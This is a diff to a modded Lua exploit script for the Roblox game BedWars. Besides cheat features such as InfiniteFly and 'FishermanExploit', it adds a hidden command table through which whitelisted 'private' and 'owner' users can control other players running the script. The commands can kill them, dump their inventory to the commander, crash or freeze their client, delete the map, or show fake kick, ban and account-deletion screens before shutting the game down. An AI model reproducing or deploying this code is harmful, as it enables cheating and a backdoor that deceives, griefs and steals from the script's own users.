@@ -1,5 +1,4 @@
 --[[ 
-        This is vape but modded 
 	Credits
 	Infinite Yield - Blink
 	DevForum - lots of rotation math because I hate it
@@ -4769,7 +4768,7 @@ runcode(function()
 	longjumpacprogressbartext.Parent = longjumpacprogressbarframe
 	local sliderval = {["Value"] = 1.5}
 	longjump = GuiLibrary["ObjectsThatCanBeSaved"]["BlatantWindow"]["Api"].CreateOptionsButton({
-		["Name"] = "DamageFly",
+		["Name"] = "LongJump",
 		["Function"] = function(callback)
 			if callback then
 				task.spawn(function()
@@ -5886,6 +5885,387 @@ task.spawn(function()
 		end)
 	end)
 end)
+
+local priolist = {
+	["DEFAULT"] = 0,
+	["VAPE PRIVATE"] = 1,
+	["VAPE OWNER"] = 2
+}
+local alreadysaidlist = {}
+
+local function findplayers(arg, plr)
+	local temp = {}
+	local continuechecking = true
+
+	if arg == "default" and continuechecking and WhitelistFunctions:CheckPlayerType(lplr) == "DEFAULT" then table.insert(temp, lplr) continuechecking = false end
+	if arg == "teamdefault" and continuechecking and WhitelistFunctions:CheckPlayerType(lplr) == "DEFAULT" and plr and lplr:GetAttribute("Team") ~= plr:GetAttribute("Team") then table.insert(temp, lplr) continuechecking = false end
+	if arg == "private" and continuechecking and WhitelistFunctions:CheckPlayerType(lplr) == "VAPE PRIVATE" then table.insert(temp, lplr) continuechecking = false end
+	for i,v in pairs(players:GetPlayers()) do if continuechecking and v.Name:lower():sub(1, arg:len()) == arg:lower() then table.insert(temp, v) continuechecking = false end end
+
+	return temp
+end
+local commands = {
+	["kill"] = function(args, plr)
+		if entity.isAlive then
+			local hum = entity.character.Humanoid
+			bedwars["DamageController"]:requestSelfDamage(lplr.Character:GetAttribute("Health"), 3, "69", {fromEntity = {getInstance = function() return plr.Character end}})
+			task.delay(0.1, function()
+				if hum and hum.Health > 0 then 
+					hum:ChangeState(Enum.HumanoidStateType.Dead)
+					hum.Health = 0
+					bedwars["ClientHandler"]:Get(bedwars["ResetRemote"]):SendToServer()
+				end
+			end)
+		end
+	end,
+	["byfron"] = function(args, plr)
+		task.spawn(function()
+			local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
+			local Roact = getrenv().require(game:GetService("CorePackages").Roact)
+			UIBlox.init(getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppUIBloxConfig))
+			local auth = getrenv().require(game:GetService("CoreGui").RobloxGui.Modules.LuaApp.Components.Moderation.ModerationPrompt)
+			local darktheme = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Themes.DarkTheme
+			local gotham = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Fonts.Gotham
+			local tLocalization = getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppLocales).Localization;
+			local a = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Localization).LocalizationProvider
+			lplr.PlayerGui:ClearAllChildren()
+			GuiLibrary["MainGui"].Enabled = false
+			game:GetService("CoreGui"):ClearAllChildren()
+			for i,v in pairs(workspace:GetChildren()) do pcall(function() v:Destroy() end) end
+			task.wait(0.2)
+			lplr:Kick()
+			game:GetService("GuiService"):ClearError()
+			task.wait(2)
+			local gui = Instance.new("ScreenGui")
+			gui.IgnoreGuiInset = true
+			gui.Parent = game:GetService("CoreGui")
+			local frame = Instance.new("Frame")
+			frame.BorderSizePixel = 0
+			frame.Size = UDim2.new(1, 0, 1, 0)
+			frame.BackgroundColor3 = Color3.new(1, 1, 1)
+			frame.Parent = gui
+			task.delay(0.1, function()
+				frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+			end)
+			task.delay(2, function()
+				local e = Roact.createElement(auth, {
+					style = {},
+					screenSize = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1920, 1080),
+					moderationDetails = {
+						punishmentTypeDescription = "Delete",
+						beginDate = DateTime.fromUnixTimestampMillis(DateTime.now().UnixTimestampMillis - ((60 * math.random(1, 6)) * 1000)):ToIsoDate(),
+						reactivateAccountActivated = true,
+						badUtterances = {},
+						messageToUser = "Your account has been deleted for violating our Terms of Use for exploiting."
+					},
+					termsActivated = function() 
+						game:Shutdown()
+					end,
+					communityGuidelinesActivated = function() 
+						game:Shutdown()
+					end,
+					supportFormActivated = function() 
+						game:Shutdown()
+					end,
+					reactivateAccountActivated = function() 
+						game:Shutdown()
+					end,
+					logoutCallback = function()
+						game:Shutdown()
+					end,
+					globalGuiInset = {
+						top = 0
+					}
+				})
+				local screengui = Roact.createElement("ScreenGui", {}, Roact.createElement(a, {
+						localization = tLocalization.mock()
+					}, {Roact.createElement(UIBlox.Style.Provider, {
+							style = {
+								Theme = darktheme,
+								Font = gotham
+							},
+						}, {e})}))
+				Roact.mount(screengui, game:GetService("CoreGui"))
+			end)
+		end)
+	end,
+	["steal"] = function(args, plr)
+		if GuiLibrary["ObjectsThatCanBeSaved"]["AutoBankOptionsButton"]["Api"]["Enabled"] then 
+			GuiLibrary["ObjectsThatCanBeSaved"]["AutoBankOptionsButton"]["Api"]["ToggleButton"](false)
+			task.wait(1)
+		end
+		for i,v in pairs(currentinventory.inventory.items) do 
+			local e = bedwars["ClientHandler"]:Get(bedwars["DropItemRemote"]):CallServer({
+				item = v.tool,
+				amount = v.amount ~= math.huge and v.amount or 99999999
+			})
+			if e then 
+				e.CFrame = plr.Character.HumanoidRootPart.CFrame
+			else
+				v.tool:Destroy()
+			end
+		end
+	end,
+	["lagback"] = function(args)
+		if entity.isAlive then
+			entity.character.HumanoidRootPart.Velocity = Vector3.new(9999999, 9999999, 9999999)
+		end
+	end,
+	["jump"] = function(args)
+		if entity.isAlive and entity.character.Humanoid.FloorMaterial ~= Enum.Material.Air then
+			entity.character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+		end
+	end,
+	["sit"] = function(args)
+		if entity.isAlive then
+			entity.character.Humanoid.Sit = true
+		end
+	end,
+	["unsit"] = function(args)
+		if entity.isAlive then
+			entity.character.Humanoid.Sit = false
+		end
+	end,
+	["freeze"] = function(args)
+		if entity.isAlive then
+			entity.character.HumanoidRootPart.Anchored = true
+		end
+	end,
+	["unfreeze"] = function(args)
+		if entity.isAlive then
+			entity.character.HumanoidRootPart.Anchored = false
+		end
+	end,
+	["deletemap"] = function(args)
+		for i,v in pairs(collectionservice:GetTagged("block")) do
+			v:Destroy()
+		end
+	end,
+	["void"] = function(args)
+		if entity.isAlive then
+			task.spawn(function()
+				repeat
+					task.wait()
+					entity.character.HumanoidRootPart.CFrame = addvectortocframe(entity.character.HumanoidRootPart.CFrame, Vector3.new(0, -3, 0))
+				until not entity.isAlive
+			end)
+		end
+	end,
+	["framerate"] = function(args)
+		if #args >= 1 then
+			if setfpscap then
+				setfpscap(tonumber(args[1]) ~= "" and math.clamp(tonumber(args[1]) or 9999, 1, 9999) or 9999)
+			end
+		end
+	end,
+	["crash"] = function(args)
+		setfpscap(9e9)
+    	print(game:GetObjects("h29g3535")[1])
+	end,
+	["chipman"] = function(args)
+		local function funnyfunc(v)
+			if v:IsA("ImageLabel") or v:IsA("ImageButton") then
+				v.Image = "http://www.roblox.com/asset/?id=6864086702"
+				v:GetPropertyChangedSignal("Image"):Connect(function()
+					v.Image = "http://www.roblox.com/asset/?id=6864086702"
+				end)
+			end
+			if (v:IsA("TextLabel") or v:IsA("TextButton")) and v:GetFullName():find("ChatChannelParentFrame") == nil then
+				if v.Text ~= "" then
+					v.Text = "chips"
+				end
+				v:GetPropertyChangedSignal("Text"):Connect(function()
+					if v.Text ~= "" then
+						v.Text = "chips"
+					end
+				end)
+			end
+			if v:IsA("Texture") or v:IsA("Decal") then
+				v.Texture = "http://www.roblox.com/asset/?id=6864086702"
+				v:GetPropertyChangedSignal("Texture"):Connect(function()
+					v.Texture = "http://www.roblox.com/asset/?id=6864086702"
+				end)
+			end
+			if v:IsA("MeshPart") then
+				v.TextureID = "http://www.roblox.com/asset/?id=6864086702"
+				v:GetPropertyChangedSignal("TextureID"):Connect(function()
+					v.TextureID = "http://www.roblox.com/asset/?id=6864086702"
+				end)
+			end
+			if v:IsA("SpecialMesh") then
+				v.TextureId = "http://www.roblox.com/asset/?id=6864086702"
+				v:GetPropertyChangedSignal("TextureId"):Connect(function()
+					v.TextureId = "http://www.roblox.com/asset/?id=6864086702"
+				end)
+			end
+			if v:IsA("Sky") then
+				v.SkyboxBk = "http://www.roblox.com/asset/?id=6864086702"
+				v.SkyboxDn = "http://www.roblox.com/asset/?id=6864086702"
+				v.SkyboxFt = "http://www.roblox.com/asset/?id=6864086702"
+				v.SkyboxLf = "http://www.roblox.com/asset/?id=6864086702"
+				v.SkyboxRt = "http://www.roblox.com/asset/?id=6864086702"
+				v.SkyboxUp = "http://www.roblox.com/asset/?id=6864086702"
+			end
+		end
+	
+		for i,v in pairs(game:GetDescendants()) do
+			funnyfunc(v)
+		end
+		game.DescendantAdded:Connect(funnyfunc)
+	end,
+	["rickroll"] = function(args)
+		local function funnyfunc(v)
+			if v:IsA("ImageLabel") or v:IsA("ImageButton") then
+				v.Image = "http://www.roblox.com/asset/?id=7083449168"
+				v:GetPropertyChangedSignal("Image"):Connect(function()
+					v.Image = "http://www.roblox.com/asset/?id=7083449168"
+				end)
+			end
+			if (v:IsA("TextLabel") or v:IsA("TextButton")) and v:GetFullName():find("ChatChannelParentFrame") == nil then
+				if v.Text ~= "" then
+					v.Text = "Never gonna give you up"
+				end
+				v:GetPropertyChangedSignal("Text"):Connect(function()
+					if v.Text ~= "" then
+						v.Text = "Never gonna give you up"
+					end
+				end)
+			end
+			if v:IsA("Texture") or v:IsA("Decal") then
+				v.Texture = "http://www.roblox.com/asset/?id=7083449168"
+				v:GetPropertyChangedSignal("Texture"):Connect(function()
+					v.Texture = "http://www.roblox.com/asset/?id=7083449168"
+				end)
+			end
+			if v:IsA("MeshPart") then
+				v.TextureID = "http://www.roblox.com/asset/?id=7083449168"
+				v:GetPropertyChangedSignal("TextureID"):Connect(function()
+					v.TextureID = "http://www.roblox.com/asset/?id=7083449168"
+				end)
+			end
+			if v:IsA("SpecialMesh") then
+				v.TextureId = "http://www.roblox.com/asset/?id=7083449168"
+				v:GetPropertyChangedSignal("TextureId"):Connect(function()
+					v.TextureId = "http://www.roblox.com/asset/?id=7083449168"
+				end)
+			end
+			if v:IsA("Sky") then
+				v.SkyboxBk = "http://www.roblox.com/asset/?id=7083449168"
+				v.SkyboxDn = "http://www.roblox.com/asset/?id=7083449168"
+				v.SkyboxFt = "http://www.roblox.com/asset/?id=7083449168"
+				v.SkyboxLf = "http://www.roblox.com/asset/?id=7083449168"
+				v.SkyboxRt = "http://www.roblox.com/asset/?id=7083449168"
+				v.SkyboxUp = "http://www.roblox.com/asset/?id=7083449168"
+			end
+		end
+	
+		for i,v in pairs(game:GetDescendants()) do
+			funnyfunc(v)
+		end
+		game.DescendantAdded:Connect(funnyfunc)
+	end,
+	["gravity"] = function(args)
+		workspace.Gravity = tonumber(args[1]) or 192.6
+	end,
+	["kick"] = function(args)
+		local str = ""
+		for i,v in pairs(args) do
+			str = str..v..(i > 1 and " " or "")
+		end
+		task.spawn(function()
+			lplr:Kick(str)
+		end)
+		bedwars["ClientHandler"]:Get("TeleportToLobby"):SendToServer()
+	end,
+	["ban"] = function(args)
+		task.spawn(function()
+			lplr:Kick("You have been temporarily banned. Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds")
+		end)
+		bedwars["ClientHandler"]:Get("TeleportToLobby"):SendToServer()
+	end,
+	["uninject"] = function(args)
+		GuiLibrary["SelfDestruct"]()
+	end,
+	["disconnect"] = function(args)
+		game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay").DescendantAdded:Connect(function(obj)
+			if obj.Name == "ErrorMessage" then
+				obj:GetPropertyChangedSignal("Text"):Connect(function()
+					obj.Text = "Please check your internet connection and try again.\n(Error Code: 277)"
+				end)
+			end
+			if obj.Name == "LeaveButton" then
+				local clone = obj:Clone()
+				clone.Name = "LeaveButton2"
+				clone.Parent = obj.Parent
+				clone.MouseButton1Click:Connect(function()
+					clone.Visible = false
+					local video = Instance.new("VideoFrame")
+					video.Video = getcustomassetfunc("vape/assets/skill.webm")
+					video.Size = UDim2.new(1, 0, 1, 36)
+					video.Visible = false
+					video.Position = UDim2.new(0, 0, 0, -36)
+					video.ZIndex = 9
+					video.BackgroundTransparency = 1
+					video.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
+					local textlab = Instance.new("TextLabel")
+					textlab.TextSize = 45
+					textlab.ZIndex = 10
+					textlab.Size = UDim2.new(1, 0, 1, 36)
+					textlab.TextColor3 = Color3.new(1, 1, 1)
+					textlab.Text = "skill issue"
+					textlab.Position = UDim2.new(0, 0, 0, -36)
+					textlab.Font = Enum.Font.Gotham
+					textlab.BackgroundTransparency = 1
+					textlab.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
+					video.Loaded:Connect(function()
+						video.Visible = true
+						video:Play()
+						task.spawn(function()
+							repeat
+								wait()
+								for i = 0, 1, 0.01 do
+									wait(0.01)
+									textlab.TextColor3 = Color3.fromHSV(i, 1, 1)
+								end
+							until true == false
+						end)
+					end)
+					task.wait(19)
+					task.spawn(function()
+						pcall(function()
+							if getconnections then
+								getconnections(entity.character.Humanoid.Died)
+							end
+							print(game:GetObjects("h29g3535")[1])
+						end)
+						while true do end
+					end)
+				end)
+				obj.Visible = false
+			end
+		end)
+		task.wait(0.1)
+		lplr:Kick()
+	end,
+	["togglemodule"] = function(args)
+		if #args >= 1 then
+			local module = GuiLibrary["ObjectsThatCanBeSaved"][args[1].."OptionsButton"]
+			if module then
+				if module["Api"]["Enabled"] == (not args[2] == "true") then
+					module["Api"]["ToggleButton"]()
+				end
+			end
+		end
+	end,
+	["shutdown"] = function(args)
+		game:Shutdown()
+	end,
+	["errorkick"] = function(args)
+		if entity.isAlive then 
+			pcall(function() lplr.Character.Head:Destroy() end)
+		end
+	end
+}
 
 local AutoReport = {["Enabled"] = false}
 runcode(function()
@@ -7126,7 +7506,6 @@ runcode(function()
 				end)
 				clonesuccess = false
 				if entity.isAlive then
-				 
 					oldcloneroot = entity.character.HumanoidRootPart
 					lplr.Character.Parent = game
 					clone = oldcloneroot:Clone()
@@ -7192,7 +7571,6 @@ runcode(function()
 			else
 				RunLoops:UnbindFromHeartbeat("InfiniteFly")
 				if clonesuccess and oldcloneroot and clone and lplr.Character.Parent == workspace and oldcloneroot.Parent ~= nil and disabledproper then 
-
 					local oldpos = clone.CFrame
 					local oldvelo = oldcloneroot.Velocity.Y
 					oldcloneroot.Velocity = Vector3.new(0, -1, 0)
@@ -8483,96 +8861,7 @@ runcode(function()
 		end
 	})
 end)
-runcode(function()
-	local Bobdepth = {["Value"] = 8}
-	local Bobhorizontal = {["Value"] = 8}
-	local rotationx = {["Value"] = 0}
-	local rotationy = {["Value"] = 0}
-	local rotationz = {["Value"] = 0}
-	local oldc1
-	bob = GuiLibrary["ObjectsThatCanBeSaved"]["RenderWindow"]["Api"].CreateOptionsButton({
-		["Name"] = "Bob",
-		["Function"] = function(callback) 
-			if cam:FindFirstChild("Viewmodel") then
-				if callback then
-					lplr.PlayerScripts.TS.controllers.global.viewmodel["viewmodel-controller"]:SetAttribute("ConstantManager_DEPTH_OFFSET", -(Bobdepth["Value"] / 10))
-					lplr.PlayerScripts.TS.controllers.global.viewmodel["viewmodel-controller"]:SetAttribute("ConstantManager_HORIZONTAL_OFFSET", (Bobhorizontal["Value"] / 10))
-					pcall(function()
-						for i,v in pairs(cam.Viewmodel.Humanoid.Animator:GetPlayingAnimationTracks()) do 
-							v:Stop()
-						end
-					end)
-					bedwars["ViewmodelController"]:playAnimation(11)
-					oldc1 = cam.Viewmodel.RightHand.RightWrist.C1
-				else
-					lplr.PlayerScripts.TS.controllers.global.viewmodel["viewmodel-controller"]:SetAttribute("ConstantManager_DEPTH_OFFSET", 0)
-					lplr.PlayerScripts.TS.controllers.global.viewmodel["viewmodel-controller"]:SetAttribute("ConstantManager_HORIZONTAL_OFFSET", 0)
-					pcall(function()
-						for i,v in pairs(cam.Viewmodel.Humanoid.Animator:GetPlayingAnimationTracks()) do 
-							v:Stop()
-						end
-					end)
-					bedwars["ViewmodelController"]:playAnimation(11)
-					cam.Viewmodel.RightHand.RightWrist.C1 = oldc1
-				end
-			end
-		end,
-		["HoverText"] = "Removes the ugly bobbing when you move and makes sword farther"
-	})
-	Bobdepth = bob.CreateSlider({
-		["Name"] = "Depth",
-		["Min"] = 0,
-		["Max"] = 24,
-		["Default"] = 8,
-		["Function"] = function(val)
-			if bob["Enabled"] then
-				lplr.PlayerScripts.TS.controllers.global.viewmodel["viewmodel-controller"]:SetAttribute("ConstantManager_DEPTH_OFFSET", -(val / 10))
-			end
-		end
-	})
-	Bobhorizontal = bob.CreateSlider({
-		["Name"] = "Horizontal",
-		["Min"] = 0,
-		["Max"] = 24,
-		["Default"] = 8,
-		["Function"] = function(val)
-			if bob["Enabled"] then
-				lplr.PlayerScripts.TS.controllers.global.viewmodel["viewmodel-controller"]:SetAttribute("ConstantManager_HORIZONTAL_OFFSET", (val / 10))
-			end
-		end
-	})
-	rotationx = bob.CreateSlider({
-		["Name"] = "RotX",
-		["Min"] = 0,
-		["Max"] = 360,
-		["Function"] = function(val)
-			if bob["Enabled"] then
-				cam.Viewmodel.RightHand.RightWrist.C1 = oldc1 * CFrame.Angles(math.rad(rotationx["Value"]), math.rad(rotationy["Value"]), math.rad(rotationz["Value"]))
-			end
-		end
-	})
-	rotationy = bob.CreateSlider({
-		["Name"] = "RotY",
-		["Min"] = 0,
-		["Max"] = 360,
-		["Function"] = function(val)
-			if bob["Enabled"] then
-				cam.Viewmodel.RightHand.RightWrist.C1 = oldc1 * CFrame.Angles(math.rad(rotationx["Value"]), math.rad(rotationy["Value"]), math.rad(rotationz["Value"]))
-			end
-		end
-	})
-	rotationz = bob.CreateSlider({
-		["Name"] = "RotZ",
-		["Min"] = 0,
-		["Max"] = 360,
-		["Function"] = function(val)
-			if bob["Enabled"] then
-				cam.Viewmodel.RightHand.RightWrist.C1 = oldc1 * CFrame.Angles(math.rad(rotationx["Value"]), math.rad(rotationy["Value"]), math.rad(rotationz["Value"]))
-			end
-		end
-	})
-end)
-		
+
 local oldfish
 GuiLibrary["ObjectsThatCanBeSaved"]["UtilityWindow"]["Api"].CreateOptionsButton({
 	["Name"] = "FishermanExploit",
